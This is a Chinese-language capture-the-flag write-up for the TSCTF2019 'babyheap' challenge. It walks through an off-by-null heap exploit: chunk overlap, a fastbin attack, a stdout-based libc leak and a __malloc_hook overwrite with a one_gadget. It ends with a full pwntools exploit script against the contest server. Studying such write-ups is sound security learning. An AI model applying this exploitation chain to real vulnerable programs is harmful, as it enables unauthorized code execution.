---
title: babyheap
categories:
- TSCTF2019
---
# babyheap

## 前言

周末准备总结一下tsctf没做出来的题，这道题是姚老板出的，虽然姚老板鼓励我做出来，但是限于自己太菜，还是没能拿到flag，这里看着学长官方的wp总结一下

## 程序逻辑

程序只有分配和删除两个函数，需要用文件结构体去泄露

![main](./1.jpg)

Alloc函数分配堆块，read_data函数里存在one-byte-null漏洞，即可以多写一个空字节

![Alloc](./2.jpg)

![read_data](./4.jpg)

Delete函数里会free掉分配的chunk指针并把bss存储地址和大小的位置清空

![delete](./3.jpg)

## 漏洞利用

### 泄露Libc基址

libc泄露可以用文件结构体的方式，但是之前我们使用的是Tcache的dup，类似于2.23的double free，目前我们并没有直接可以用的double free，因此要通过chunk overlap构造重合的堆块，再进行double free。因为heap是0x1000对齐的，所以虽然开了随机化，后三位都是不变的。

第一次chunk布局：  
chunk0:0x000->0x90  
chunk1:0x090->0x40   
chunk2:0x0d0->0x70   
chunk3:0x140->0x100  
chunk4:0x240->0x40  
top_chunk:0x280  

Free(chunk2)再分配0x68大小的chunk，因为空间复用的关系实际上给的chunk为0x70，0x68->0x70这部分为chunk3的prev_size，可以将其覆盖为0x140，加上one-byte-null，chunk3的prev_in_use被覆盖为0，Free(0)再Free(3)即可使得0-3被覆盖为一个大的unsortedbin，其大小为0x240。此时main_arena+88已经被写到了0x000处。

根据之前Babytcache的经验，下面应该要让unsorted bin分配到的chunk和tcache dup可用的chunk为同一个chunk，在这里我们需要double free。再次构造一次Unsorted bin。

第二次chunk布局:  
chunk0:0x000->0x90  
chunk1:0x090->0x40  
chunk2:0x0d0->0x70  
chunk3:0x090->0x60//已经可以覆盖到0x0d0  
chunk4:0x240->0x40  
chunk5:0x0f0->0x50  
chunk6:0x140->0x100(main_arena+88)  

Free(chunk5)之后分配0x48可以覆盖掉chunk6的prev_size和prev_in_use，Free(0)再Free(6)即可合并为一个Unsorted bin到0x000处。

Free(chunk2)使得0x0d0被放入fast bin[0x70]。

![bins](./5.jpg)

继续更改chunk分配，第三次chunk布局：  
chunk0:0x000->0xd0  
chunk1:0x090->0x40  
chunk2:0x0d0->0x30(main_arena+88)
chunk3:0x090->0x60  
chunk4:0x240->0x40  
chunk5:0x0f0->0x50  
chunk6:0x100->0x100  
chunk7:0x200->0x40  
注意此时分配0xc0的时候会使得unsortebin切割到0x0c0，继而把main_arena+88写入到0x0d0，而此时的0x0d0已经位于fastbin[0x70]中。注意这里很巧妙的是分配0x20的时候写入的数据是'\n'，在read_data里直接进了if(buf=='\n')从而使得没有任何数据写入到chunk2里，因此其fd没有变。
Free(chunk3)让fast bin[0x60]多了一个chunk,0x090，再分配一个0x50的chunk，用的是fast bin的0x090，使用'a'*0x30填充到0x0d0，然后可以覆盖(0x0d0)的内容为：  
p64(0)  
p64(0x71)  
fd->*25dd  
此时fast bin的fd也被修改为*25dd

![overwrite](./6.jpg)

注意我们需要分配的是stdout，这里查看一下stdout的值，找一个离它近的fake_chunk下次修改为这个(关掉地址随机化方便调试)，之后分配到这个fake_chunk进而覆盖stdout，泄露得到地址，调试的时候拿vmmap看下偏移，即可算出Libc基地址

![offset](./7.jpg)

### get shell

还是按照之前的套路，修改chunk11的prev_size和prev_in_use，此时堆布局如下:  
chunk0:0x000->0xd0   
chunk1:0x090->0x40  
chunk2:0x0d0->0x30  
chunk3:0x090->0x60  
chunk4:0x240->0x40  
chunk5:0x0f0->0x50  
chunk6:0x100->0x100  
chunk7:0x200->0x40  
chunk8:0x0d0->0x70  
chunk9:fake_chunk1->0x60  
chunk10:290->0x20  
chunk11:0x2a0->0x100  
Free(chunk3)和Free(chunk8)使得产生两个fast bin

![free fast bins](./8.jpg)

分配一个0x60大的chunk，覆写到0xd0处，修改其fd为target_addr

![target_addr](./9.jpg)

分配一个0x70chunk,再分配一个0x70大的chunk即可覆写__malloc_hook，之后通过__malloc_print_err触发malloc_hook，得到flag

## exp.py
```py
#coding=utf-8
from time import sleep
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level="info")
context.terminal = ['tmux','split','-h']
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
#p = process('./nofile')
#elf = ELF('./nofile')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    p = process('./babyheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    gdb.attach(p)
else:
    p = remote('10.112.100.47',10003)
    libc = ELF('./libc.so.6')

def Alloc(size,data):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Input data: ')
    p.send(data)

def Free(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('input which chunk you want to delete: ')
    p.sendline(str(index))

def exp():
    '''
    Alloc(0x80,'a\n')#0
    Alloc(0x30,'b\n')#1
    Alloc(0x70-8,'d\n')#2
    Alloc(0xf0,'d'*0xf0)#3
    Alloc(0x30,'e\n')#4
    '''
    Alloc(0x80,'a'*0x80)#0
    Alloc(0x30,'a'*0x30)#1
    Alloc(0x60,'a'*0x60)#2
    Alloc(0xf0,'a'*0xf0)#3
    Alloc(0x30,'a'*0x30)#4
    Free(2)
    Alloc(0x68,'x'*0x60+p64(0x140))
    log.success('overwrite ok!')
    Free(0)
    Free(3)
    log.success('free chunks ok!')
    Alloc(0x80,'z\n')#0
    Alloc(0x50,'z\n')#3---->1,overlap 2
    Alloc(0x40,'z\n')#5
    Alloc(0xf0,'z\n')#6
    log.success('chunks re malloc ok!')
    #fast bin attack
    Free(5)
    Alloc(0x48,'a'*0x40+p64(0xf0+0x50))#5
    Free(0)
    Free(6)

    Free(2)
    Alloc(0xc0,'a\n')#0
    Alloc(0x20,'\n')#2
    Alloc(0xf0,'b\n')#6
    Alloc(0x30,'c\n')#7
    ##
    Free(3)
    payload = 'a'*0x30+p64(0)+p64(0x71)+'\xdd\x25\n'
    Alloc(0x50,payload)#3
    log.success('ready to malloc fake chunk')
    Alloc(0x60,'wz\n')#8
    Alloc(0x60,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n')#9
    p.recvuntil('\x00\x18\xad\xfb')
    p.recvn(28)
    libc_addr = u64(p.recvn(8))
    log.info('libc addr => ' + hex(libc_addr))
    libc_base = libc_addr - 0x3c5600
    log.info('libc base => ' + hex(libc_base))
    malloc_hook = libc.symbols['__malloc_hook']
    target_addr = libc_base + malloc_hook - 0x23
    log.success('malloc hook addr => ' + hex(target_addr))
    #get shell
    shell_addr = libc_base + gadgets[2]
    Alloc(0x10,'wz\n')#10
    Alloc(0xf0,'wz\n')#11
    Free(10)
    log.info('before to overwrite next chunk')
    Alloc(0x18,'a'*0x10+p64(0x60))#10
    #fast bin attack,modify __malloc_hook
    Free(8)
    Free(3)
    Alloc(0x50,'a'*0x30+p64(0)+p64(0x71)+p64(target_addr)+'\n')
    Alloc(0x60,'wz\n')#8
    payload = '\x00'*0x13 + p64(shell_addr) + '\n'
    Alloc(0x60,payload)
    #trigger

    Free(11)

    p.interactive()
exp()

```


## flag

![flag](./10.jpg)

## 收获

大佬们做堆跟玩速拼魔方一样，我写就跟背着公式一点点摸索一样。自己真是太菜了。这个题的思路是用off-byte-one制造大的unsorted bin，然后第一次分配产生overlap chunk，从而给堆溢出制造了空间。第二次还是这个套路，用unsorted bin切割之后的chunk的fd会被写入main_arena+88，这次直接到0x0d0处，在此之前0x0d0处的0x70大小的chunk已经进入了fast_bin(free(2))。所以达到了既在fast bin，其fd又为main_arena+88的目的。继续下去，free(3)可以得到刚才所说的0x090的堆块，用它溢出到0x0d0这个堆块修改其fd即可分配到stdout那里泄露地址。

同样的套路，刚才一顿操作使得chunk3那里是0x090，chunk8那里是0x0d0,删除它们并分配，用0x090覆盖到0x0d0，从而分配到__malloc_hook附近的fake_chunk，从而覆写其为one_gadget_addr。这里一个新知识是malloc_print_err触发的时候会使用malloc_hook，这里触发err的方法是和开始一样构造合并，但是因为要合并的0x040的next_chunk的prev_size与其size(0x40)不相等，造成error，最终得到shell
